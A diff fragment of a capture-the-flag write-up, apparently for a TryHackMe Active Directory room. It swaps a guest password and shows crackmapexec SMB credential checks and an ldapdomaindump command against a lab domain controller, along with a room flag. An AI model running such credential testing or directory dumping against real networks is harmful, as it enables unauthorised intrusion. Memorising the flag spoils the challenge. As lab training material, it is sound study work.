@@ -83,13 +83,13 @@ $dbname = "cooctus_db";
 
 I tested for null/guest SMB authentication:
 ```bash
-crackmapexec smb DC.COOCTUS.CORP -u Visitor -p Guest1234
+crackmapexec smb DC.COOCTUS.CORP -u Visitor -p GuestLogin! 
 ```
 
 Output:
 ```
 SMB         10.64.158.191   445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:COOCTUS.CORP) (signing:True) (SMBv1:False)
-SMB         10.64.158.191   445    DC               [+] COOCTUS.CORP\Visitor:Guest1234
+SMB         10.64.158.191   445    DC               [+] COOCTUS.CORP\Visitor:GuestLogin!
 ```
 
 ✔ **Success:** Guest credentials valid!
@@ -145,7 +145,7 @@ THM{Gu3st_Pl3as3}
 
 With valid domain credentials, I dumped LDAP data:
 ```bash
-ldapdomaindump -u '10.64.158.191\Visitor' -p 'Guest1234' DC.COOCTUS.CORP
+ldapdomaindump -u '10.64.158.191\Visitor' -p 'GuestLogin!' DC.COOCTUS.CORP
 ```
 
 Output:
